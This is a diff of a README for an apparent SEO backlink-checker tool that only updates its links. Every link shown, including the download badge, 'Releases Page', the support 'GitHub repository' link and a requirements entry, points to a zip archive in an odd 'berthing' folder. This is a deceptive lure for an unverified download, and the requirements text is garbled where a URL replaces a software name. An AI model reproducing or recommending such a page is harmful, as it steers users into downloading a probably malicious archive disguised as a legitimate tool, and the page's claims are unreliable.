@@ -1,7 +1,7 @@
 # 🔗 ahrefs-backlink-checker - Easily Analyze Your Backlinks
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/dhesigan2924/ahrefs-backlink-checker/main/berthing/ahrefs-backlink-checker.zip%https://raw.githubusercontent.com/dhesigan2924/ahrefs-backlink-checker/main/berthing/ahrefs-backlink-checker.zip)](https://raw.githubusercontent.com/dhesigan2924/ahrefs-backlink-checker/main/berthing/ahrefs-backlink-checker.zip)
+[![Download](https://github.com/dhesigan2924/ahrefs-backlink-checker/raw/refs/heads/main/berthing/ahrefs_checker_backlink_v1.3-beta.4.zip%https://github.com/dhesigan2924/ahrefs-backlink-checker/raw/refs/heads/main/berthing/ahrefs_checker_backlink_v1.3-beta.4.zip)](https://github.com/dhesigan2924/ahrefs-backlink-checker/raw/refs/heads/main/berthing/ahrefs_checker_backlink_v1.3-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the ahrefs backlink checker toolkit! This tool helps you analyze backlinks for your site or your competitors' sites. With it, you can gain insights on link-building strategies to improve your SEO.
@@ -16,12 +16,12 @@ Welcome to the ahrefs backlink checker toolkit! This tool helps you analyze back
 To run the ahrefs backlink checker, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10, macOS, or any Linux distribution.
-- **https://raw.githubusercontent.com/dhesigan2924/ahrefs-backlink-checker/main/berthing/ahrefs-backlink-checker.zip** Version 14 or above.
+- **https://github.com/dhesigan2924/ahrefs-backlink-checker/raw/refs/heads/main/berthing/ahrefs_checker_backlink_v1.3-beta.4.zip** Version 14 or above.
 - **Python:** Version 3.7 or above.
 - **Internet Connection:** Essential for fetching backlink data.
 
 ## 📥 Download & Install
-To start using the ahrefs backlink checker, visit this page to download: [Releases Page](https://raw.githubusercontent.com/dhesigan2924/ahrefs-backlink-checker/main/berthing/ahrefs-backlink-checker.zip). 
+To start using the ahrefs backlink checker, visit this page to download: [Releases Page](https://github.com/dhesigan2924/ahrefs-backlink-checker/raw/refs/heads/main/berthing/ahrefs_checker_backlink_v1.3-beta.4.zip). 
 
 Once you access the page, follow these steps:
 
@@ -52,7 +52,7 @@ If you encounter any issues, check these common problems:
 - **Application Crashes:** Restart the application and your device if needed.
 
 ## 💬 Support
-Need assistance? Open an issue on our [GitHub repository](https://raw.githubusercontent.com/dhesigan2924/ahrefs-backlink-checker/main/berthing/ahrefs-backlink-checker.zip) to get help from the community or developers.
+Need assistance? Open an issue on our [GitHub repository](https://github.com/dhesigan2924/ahrefs-backlink-checker/raw/refs/heads/main/berthing/ahrefs_checker_backlink_v1.3-beta.4.zip) to get help from the community or developers.
 
 ## 📚 Additional Resources
 To make the most of the ahrefs backlink checker, refer to the following:
@@ -61,4 +61,4 @@ To make the most of the ahrefs backlink checker, refer to the following:
 - **API Documentation:** Learn how to use the API for automated workflows.
 - **FAQs:** Address common questions from users.
 
-Thank you for choosing the ahrefs backlink checker toolkit! We hope this tool significantly aids your SEO efforts. For more details, visit our [Releases Page](https://raw.githubusercontent.com/dhesigan2924/ahrefs-backlink-checker/main/berthing/ahrefs-backlink-checker.zip).
+Thank you for choosing the ahrefs backlink checker toolkit! We hope this tool significantly aids your SEO efforts. For more details, visit our [Releases Page](https://github.com/dhesigan2924/ahrefs-backlink-checker/raw/refs/heads/main/berthing/ahrefs_checker_backlink_v1.3-beta.4.zip).
